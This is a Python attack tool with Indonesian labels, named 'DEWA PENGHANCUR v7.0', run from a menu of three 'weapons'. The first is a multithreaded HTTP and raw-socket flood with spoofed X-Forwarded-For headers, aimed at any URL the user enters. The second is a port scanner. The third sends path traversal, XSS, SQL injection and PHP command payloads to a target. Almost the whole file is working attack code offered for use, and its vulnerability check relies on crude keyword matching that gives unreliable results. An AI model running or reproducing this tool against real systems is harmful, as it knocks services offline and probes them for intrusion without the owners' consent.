import os
import sys
import time
import random
import requests
import threading
import socket
import ssl
import hashlib
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
import urllib3

# 🔥 OPTIMISASI IMPORT COLORAMA
try:
    from colorama import init, Fore
    init(autoreset=True)
    COLORS = {
        'CYAN': Fore.CYAN,
        'GREEN': Fore.GREEN, 
        'RED': Fore.RED,
        'YELLOW': Fore.YELLOW,
        'WHITE': Fore.WHITE,
        'BLUE': Fore.BLUE,
        'MAGENTA': Fore.MAGENTA
    }
except ImportError:
    COLORS = {color: "" for color in ['CYAN', 'GREEN', 'RED', 'YELLOW', 'WHITE', 'BLUE', 'MAGENTA']}

# 🔒 DISABLE WARNING dengan fungsi nyata
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 🎯 USER AGENT OPTIMIZED
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
]

# 🎯 TARGET PATHS
destroy_paths = [
    '/', '/index.php', '/admin', '/login', '/wp-admin', 
    '/api', '/.env', '/config.php'
]

# 💀 PAYLOAD PENGHANCURAN
destruction_payloads = [
    "../../../../etc/passwd",
    "<script>alert('DESTROYED')</script>",
    "' OR '1'='1' --",
    "<?php system('whoami'); ?>"
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_fingerprint():
    """Generate unique attack fingerprint"""
    unique_id = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:8]
    return f"ATK-{unique_id}"

def resource_monitor():
    """Monitor penggunaan resource"""
    try:
        import psutil
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        return {
            'cpu': cpu_percent,
            'memory': memory.percent,
            'memory_used': memory.used // (1024 * 1024),
            'success': True
        }
    except ImportError:
        return {'success': False, 'error': 'psutil not installed'}

def validate_target(target):
    """Validasi target dengan pengecekan koneksi"""
    try:
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        response = requests.head(target, timeout=3, verify=False)
        return target, response.status_code, "Target accessible"
    except requests.exceptions.RequestException as e:
        return target, "ERROR", f"Connection failed: {str(e)}"
    except Exception as e:
        return target, "ERROR", f"Validation error: {str(e)}"

def optimized_loading(text, actual_work=None):
    """Loading dengan pekerjaan riil"""
    print(f"{COLORS['CYAN']}[⚡] {text}", end="", flush=True)
    
    start_time = time.time()
    if actual_work:
        result = actual_work()
        if result:
            print(f"\r{COLORS['GREEN']}[✓] {text} BERHASIL! - {result}")
            return
    
    symbols = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
    i = 0
    while time.time() - start_time < 0.8:
        print(f"\r{COLORS['CYAN']}[{symbols[i % len(symbols)]}] {text}", end="")
        i += 1
        time.sleep(0.1)
    
    print(f"\r{COLORS['GREEN']}[✓] {text} BERHASIL!")

def show_god_banner():
    clear_screen()
    print(f"{COLORS['RED']}╔══════════════════════════════════════════════════════════════╗")
    print(f"{COLORS['RED']}║  {COLORS['CYAN']}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  {COLORS['RED']}║")
    print(f"{COLORS['RED']}║  {COLORS['CYAN']}▓▓▓▄ ▓▓▓▓ ▓▓▓▄ ▓▓▓▓▓ ▓▓▓▄ ▓▓▓▓▄▄ ▓▓▓▓▓▓ ▓▓▓▄ ▓▓▓▓▄▄ ▓▓▓▓▓▓  {COLORS['RED']}║")
    print(f"{COLORS['RED']}║  {COLORS['CYAN']}▓▓▓▓ ▓▓▓▓ ▓▓▓▓  ▓▓▓  ▓▓▓▓ ▓▓▓▓▓▓ ▓▓▓▓▓▓ ▓▓▓▓ ▓▓▓▓▓▓ ▓▓▓▓▓▓  {COLORS['RED']}║")
    print(f"{COLORS['RED']}║  {COLORS['CYAN']}▓▓▓▓ ▓▓▓▓ ▓▓▓▓  ▓▓▓  ▓▓▓▓ ▓▓▓▓▓▓ ▓▓▓▓▓▓ ▓▓▓▓ ▓▓▓▓▓▓ ▓▓▓▓▓▓  {COLORS['RED']}║")
    print(f"{COLORS['RED']}║  {COLORS['CYAN']}▓▓▓▓▀▀▀▀▀ ▓▓▓▓  ▓▓▓  ▓▓▓▓▀ ▓▓▓▓▀▀ ▓▓▓▓▀▀ ▓▓▓▓▀ ▓▓▓▓▀▀ ▓▓▓▓▀▀  {COLORS['RED']}║")
    print(f"{COLORS['RED']}║  {COLORS['CYAN']}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  {COLORS['RED']}║")
    print(f"{COLORS['RED']}╚══════════════════════════════════════════════════════════════╝")
    print(f"{COLORS['BLUE']}               ⚡ DEWA PENGHANCUR v7.0 ⚡")
    print(f"{COLORS['RED']}═════════════════════════════════════════════════════════════════")
    print(f"{COLORS['CYAN']}[+] Status: {COLORS['GREEN']}OPTIMIZED MODE ACTIVATED{COLORS['CYAN']}")
    print(f"{COLORS['RED']}═════════════════════════════════════════════════════════════════")

# 🚀 SERANGAN DEWA
def dewa_destruction():
    show_god_banner()
    print(f"{COLORS['RED']}[1] MODE DEWA - PENGHANCURAN TOTAL OPTIMIZED")
    print(f"{COLORS['BLUE']}═════════════════════════════════════════════════════════════════")
    
    target = input(f"{COLORS['CYAN']}[?] Masukkan target URL: {COLORS['WHITE']}")
    threads = int(input(f"{COLORS['CYAN']}[?] Jumlah threads (1-500): {COLORS['WHITE']}") or 100)
    duration = int(input(f"{COLORS['CYAN']}[?] Durasi serangan (detik): {COLORS['WHITE']}") or 60)
    
    validated_target, status, message = validate_target(target)
    print(f"{COLORS['GREEN']}[+] Target Status: {status} - {message}")
    
    if "ERROR" in str(status):
        print(f"{COLORS['RED']}[!] Target tidak valid!")
        input(f"{COLORS['CYAN']}[+] Tekan Enter untuk kembali...")
        return
    
    attack_id = generate_fingerprint()
    print(f"{COLORS['CYAN']}[+] Attack ID: {attack_id}")
    
    resources = resource_monitor()
    if resources.get('success'):
        print(f"{COLORS['YELLOW']}[+] System Resource: CPU {resources['cpu']}%, Memory {resources['memory_used']}MB")
    
    parsed = urlparse(validated_target)
    domain = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    
    print(f"\n{COLORS['RED']}[!] MENGAKTIFKAN SENJATA PEMUSNAH...")
    
    attack_stats = {
        'success': 0, 
        'failed': 0, 
        'exploited': 0,
        'start_time': time.time(),
        'attack_id': attack_id
    }
    lock = threading.Lock()
    end_time = time.time() + duration

    def http_annihilation(thread_id):
        session = requests.Session()
        session.verify = False
        while time.time() < end_time:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    'Accept': '*/*',
                    'Cache-Control': 'no-cache',
                    'X-Attack-ID': attack_id
                }
                
                attack_url = validated_target + random.choice(destroy_paths)
                session.get(attack_url, headers=headers, timeout=2, verify=False)
                
                with lock:
                    attack_stats['success'] += 1
                    
            except Exception as e:
                with lock:
                    attack_stats['failed'] += 1

    def socket_annihilation(thread_id):
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                
                if port == 443:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=domain)
                
                s.connect((domain, port))
                payload = f"GET {random.choice(destroy_paths)} HTTP/1.1\r\nHost: {domain}\r\n\r\n"
                s.send(payload.encode())
                s.close()
                
                with lock:
                    attack_stats['success'] += 1
                    
            except:
                with lock:
                    attack_stats['failed'] += 1

    print(f"{COLORS['GREEN']}[+] Menjalankan {threads} THREADS...")
    
    attack_threads = []
    for i in range(threads):
        if i % 2 == 0:
            t = threading.Thread(target=http_annihilation, args=(i,))
        else:
            t = threading.Thread(target=socket_annihilation, args=(i,))
        
        t.daemon = True
        t.start()
        attack_threads.append(t)

    last_count = 0
    print(f"\n{COLORS['CYAN']}[+] MEMULAI SERANGAN...")
    
    while time.time() < end_time:
        elapsed = time.time() - attack_stats['start_time']
        success = attack_stats['success']
        failed = attack_stats['failed']
        
        rps = (success - last_count) if last_count > 0 else success
        last_count = success
        
        progress = min(100, (elapsed / duration) * 100)
        progress_bar = "█" * int(progress / 2) + "░" * (50 - int(progress / 2))
        
        print(f"\r{COLORS['CYAN']}[{progress_bar}] {progress:.1f}% | Time: {elapsed:.1f}s | RPS: {rps} | Success: {success} | Failed: {failed}", end="")
        time.sleep(0.2)

    print(f"\n\n{COLORS['GREEN']}[✓] PENGHANCURAN SELESAI!")
    print(f"{COLORS['RED']}[!] SERANGAN DENGAN ID: {attack_id} TELAH BERAKHIR!")
    print(f"{COLORS['CYAN']}[+] Statistik Serangan:")
    print(f"{COLORS['CYAN']}    • Request Berhasil: {attack_stats['success']}")
    print(f"{COLORS['CYAN']}    • Request Gagal: {attack_stats['failed']}")
    
    input(f"\n{COLORS['CYAN']}[+] Tekan Enter untuk kembali...")

# 🎯 PORT SCANNER
def port_destruction():
    show_god_banner()
    print(f"{COLORS['RED']}[2] PORT DESTRUCTION SCANNER")
    print(f"{COLORS['BLUE']}═════════════════════════════════════════════════════════════════")
    
    target = input(f"{COLORS['CYAN']}[?] Masukkan target IP/Domain: {COLORS['WHITE']}")
    
    try:
        target_ip = socket.gethostbyname(target)
        print(f"{COLORS['GREEN']}[+] Target IP: {target_ip}")
    except Exception as e:
        print(f"{COLORS['RED']}[!] Gagal resolve domain: {str(e)}")
        input(f"{COLORS['CYAN']}[+] Tekan Enter untuk kembali...")
        return
    
    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            sock.close()
            return port, result == 0
        except:
            return port, False
    
    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 1433, 3306, 3389, 5432, 8080]
    open_ports = []
    
    print(f"{COLORS['CYAN']}[+] Scanning {len(common_ports)} ports...")
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        results = executor.map(scan_port, common_ports)
    
    for port, is_open in results:
        if is_open:
            open_ports.append(port)
            print(f"{COLORS['GREEN']}[✓] Port {port} TERBUKA")
    
    print(f"\n{COLORS['CYAN']}[+] Scan selesai! Port terbuka: {open_ports}")
    input(f"{COLORS['CYAN']}[+] Tekan Enter untuk kembali...")

# 💀 WEB EXPLOIT
def web_destruction():
    show_god_banner()
    print(f"{COLORS['RED']}[3] WEB DESTRUCTION EXPLOIT")
    print(f"{COLORS['BLUE']}═════════════════════════════════════════════════════════════════")
    
    url = input(f"{COLORS['CYAN']}[?] Masukkan URL target: {COLORS['WHITE']}")
    
    validated_url, status, message = validate_target(url)
    print(f"{COLORS['GREEN']}[+] Target Status: {status} - {message}")
    
    if "ERROR" in str(status):
        print(f"{COLORS['RED']}[!] Target tidak valid!")
        input(f"{COLORS['CYAN']}[+] Tekan Enter untuk kembali...")
        return
    
    vulnerabilities = []
    
    for payload in destruction_payloads[:3]:
        try:
            test_url = f"{validated_url}/{payload}"
            response = requests.get(test_url, timeout=3, verify=False)
            
            if any(keyword in response.text for keyword in ['root:', 'Database', 'config', 'error']):
                vulnerabilities.append(f"VULN: {payload}")
                print(f"{COLORS['RED']}[!] KERENTANAN: {payload}")
        except:
            pass
    
    print(f"\n{COLORS['CYAN']}[+] Scan selesai! {len(vulnerabilities)} kerentanan ditemukan!")
    input(f"{COLORS['CYAN']}[+] Tekan Enter untuk kembali...")

# 🚀 MAIN MENU
def dewa_main_menu():
    while True:
        show_god_banner()
        print(f"{COLORS['CYAN']}PILIH SENJATA DEWA:")
        print(f"{COLORS['BLUE']}═════════════════════════════════════════════════════════════════")
        print(f"{COLORS['RED']}[1] {COLORS['WHITE']}DEWA DESTRUCTION - Penghancuran Total")
        print(f"{COLORS['RED']}[2] {COLORS['WHITE']}Port Destruction - Scan Port")
        print(f"{COLORS['RED']}[3] {COLORS['WHITE']}Web Destruction - Eksploitasi Web")
        print(f"{COLORS['RED']}[0] {COLORS['WHITE']}KELUAR")
        print(f"{COLORS['BLUE']}═════════════════════════════════════════════════════════════════")
        
        choice = input(f"{COLORS['CYAN']}[?] Pilih senjata (0-3): {COLORS['WHITE']}")
        
        if choice == '1':
            dewa_destruction()
        elif choice == '2':
            port_destruction()
        elif choice == '3':
            web_destruction()
        elif choice == '0':
            print(f"\n{COLORS['RED']}[!] Keluar...")
            break
        else:
            print(f"{COLORS['RED']}[!] Pilihan tidak valid!")

if __name__ == "__main__":
    try:
        dewa_main_menu()
    except KeyboardInterrupt:
        print(f"\n{COLORS['RED']}[!] Dihentikan oleh user!")
    except Exception as e:
        print(f"\n{COLORS['RED']}[!] Error: {str(e)}")